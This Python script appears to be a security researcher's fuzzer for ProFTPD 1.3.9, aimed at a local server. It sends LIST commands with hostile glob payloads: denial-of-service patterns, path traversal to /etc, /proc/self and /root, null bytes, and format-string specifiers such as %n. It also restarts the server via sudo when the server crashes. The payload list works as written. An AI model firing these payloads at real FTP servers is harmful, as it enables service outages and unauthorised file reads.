#!/usr/bin/env python3
"""
ProFTPD Glob Expansion Targeted Fuzzer — with real PASV data channel
independent security research. — Phase 2
"""
import socket, time, json, re, os
from datetime import datetime

HOST = "127.0.0.1"
PORT = 21
USER = "ftptest"
PASS = "ftptest123"
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence"
TIMEOUT = 8

def ftp_cmd(sock, cmd, wait=True):
    if isinstance(cmd, str):
        cmd = (cmd + "\r\n").encode()
    sock.sendall(cmd)
    if wait:
        sock.settimeout(TIMEOUT)
        data = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                data += chunk
                decoded = data.decode('utf-8', errors='replace')
                lines = decoded.strip().split('\n')
                last = lines[-1]
                if len(last) >= 4 and last[:3].isdigit() and last[3] == ' ':
                    break
                if len(data) > 65536: break
        except socket.timeout:
            pass
        return data.decode('utf-8', errors='replace')
    return None

def get_pasv_addr(pasv_response):
    """Parse PASV response to get (host, port)"""
    m = re.search(r'\((\d+),(\d+),(\d+),(\d+),(\d+),(\d+)\)', pasv_response)
    if not m:
        return None
    h = '.'.join(m.group(i) for i in range(1,5))
    p = int(m.group(5)) * 256 + int(m.group(6))
    return (h, p)

def list_with_glob(glob_pattern, timeout=8):
    """Try a LIST command with a real PASV data connection. Returns (response_code, data_received, elapsed)"""
    try:
        ctrl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ctrl.settimeout(TIMEOUT)
        ctrl.connect((HOST, PORT))
        banner = ftp_cmd(ctrl, "")
        banner = ctrl.recv(1024).decode('utf-8', errors='replace')

        ftp_cmd(ctrl, f"USER {USER}")
        ftp_cmd(ctrl, f"PASS {PASS}")
        ftp_cmd(ctrl, "TYPE A")

        # Open PASV
        pasv_resp = ftp_cmd(ctrl, "PASV")
        addr = get_pasv_addr(pasv_resp)
        if not addr:
            ctrl.close()
            return (None, None, None)

        # Connect data socket
        data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        data_sock.settimeout(timeout)
        data_sock.connect(addr)

        # Send LIST
        t0 = time.time()
        ctrl.sendall(f"LIST {glob_pattern}\r\n".encode())

        # Read ctrl response (150)
        ctrl.settimeout(5)
        try:
            ctrl_resp = ctrl.recv(1024).decode('utf-8', errors='replace')
        except:
            ctrl_resp = ""

        # Read data
        data_received = b""
        try:
            data_sock.settimeout(timeout)
            while True:
                chunk = data_sock.recv(4096)
                if not chunk: break
                data_received += chunk
        except socket.timeout:
            pass
        data_sock.close()
        elapsed = time.time() - t0

        # Read final ctrl response (226)
        ctrl.settimeout(3)
        try:
            final_resp = ctrl.recv(1024).decode('utf-8', errors='replace')
            ctrl_resp += final_resp
        except:
            pass

        ftp_cmd(ctrl, "QUIT")
        ctrl.close()
        return (ctrl_resp, data_received.decode('utf-8', errors='replace'), elapsed)

    except Exception as e:
        return (None, str(e), None)

def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3); s.connect((HOST, PORT)); d = s.recv(256); s.close()
        return b"220" in d
    except: return False

def main():
    results = {
        "fuzzer": "glob_expansion_pasv",
        "target": f"ProFTPD 1.3.9 at {HOST}:{PORT}",
        "start_time": datetime.now().isoformat(),
        "test_cases": [], "crashes": [], "slow_responses": [],
        "total_tests": 0, "total_crashes": 0
    }

    print("=" * 60)
    print("[*] ProFTPD Glob Fuzzer (with real PASV data channel)")
    print("=" * 60)

    glob_payloads = [
        # Normal
        ("*", "all files"),
        ("**", "double star"),
        ("?", "single char wildcard"),
        # Long/repeated
        ("*" * 100, "100 stars"),
        ("*" * 500, "500 stars"),
        ("*" * 1000, "1000 stars"),
        ("?" * 100, "100 question marks"),
        # Bracket expressions - unclosed
        ("[", "unclosed bracket"),
        ("[[", "double unclosed"),
        ("[" * 50, "50 unclosed brackets"),
        ("[a-z]" * 50, "50 char class repeats"),
        ("[!a-z0-9]" * 30, "30 negated char classes"),
        # Brace expansion
        ("{a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z}", "full alphabet brace"),
        ("{" + ",".join("A"*10 for _ in range(100)) + "}", "100-element brace"),
        # Deeply nested
        ("*/*/*/*/*/*/*/*/*/*", "10-level deep"),
        ("*/*" * 20, "20-level deep"),
        ("?/?/?/?/?/?/?/?/?/?", "alternating wildcards"),
        # CPU bomb patterns
        ("[" + "a-z" * 20 + "]" * 20, "nested char classes"),
        ("*[*]*[*]*[*]*", "star bracket star"),
        # Path traversal in glob
        ("../*", "parent dir glob"),
        ("../../*", "two levels up"),
        ("../../../etc/*", "etc glob via traversal"),
        ("../../../proc/self/*", "proc self glob"),
        # Null bytes
        ("*\x00*", "null byte in glob"),
        ("test\x00*", "null byte prefix"),
        # Format strings in glob
        ("%x*", "format str prefix"),
        ("*%s*", "format str middle"),
        ("%n*", "write format str"),
        # Special filesystem paths
        ("/etc/*", "absolute /etc glob"),
        ("/proc/self/*", "absolute /proc glob"),
        ("/root/*", "absolute /root glob"),
        # Very long with traversal
        ("../" * 30 + "*", "30x traversal + star"),
        # Recursive DoS attempt (brace + star)
        ("{*,**,***}", "brace with stars"),
        ("{{{{{{{{{{", "deeply nested braces"),
    ]

    for pattern, label in glob_payloads:
        if not check_alive():
            print(f"  [!!!] Server down! Restarting...")
            os.system("sudo proftpd 2>/dev/null")
            time.sleep(2)

        print(f"  [>] LIST {label}: {repr(pattern[:50])}")
        resp, data, elapsed = list_with_glob(pattern, timeout=6)
        results["total_tests"] += 1

        status = "OK"
        notes = ""

        if resp is None:
            if not check_alive():
                status = "CRASH"
                results["total_crashes"] += 1
                notes = "Server died"
                print(f"    [!!!] CRASH!")
            else:
                status = "TIMEOUT_OR_ERROR"
                notes = str(data)
        elif elapsed and elapsed > 3.0:
            status = "SLOW"
            notes = f"Response took {elapsed:.2f}s"
            results["slow_responses"].append({
                "pattern": pattern, "label": label, "elapsed": elapsed})
            print(f"    [!] SLOW response: {elapsed:.2f}s")

        tc = {
            "id": results["total_tests"],
            "pattern": pattern[:200],
            "label": label,
            "status": status,
            "response": (resp or "")[:300],
            "data_len": len(data) if isinstance(data, str) else 0,
            "elapsed_s": round(elapsed, 3) if elapsed else None,
            "notes": notes
        }
        results["test_cases"].append(tc)
        if status == "CRASH":
            results["crashes"].append(tc)

        time.sleep(0.1)

    results["end_time"] = datetime.now().isoformat()
    outfile = os.path.join(EVIDENCE_DIR, "fuzzer_glob_pasv.json")
    with open(outfile, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"\n[*] Results: {results['total_tests']} tests, {results['total_crashes']} crashes")
    print(f"    Slow responses: {len(results['slow_responses'])}")
    print(f"    Saved: {outfile}")

if __name__ == "__main__":
    main()
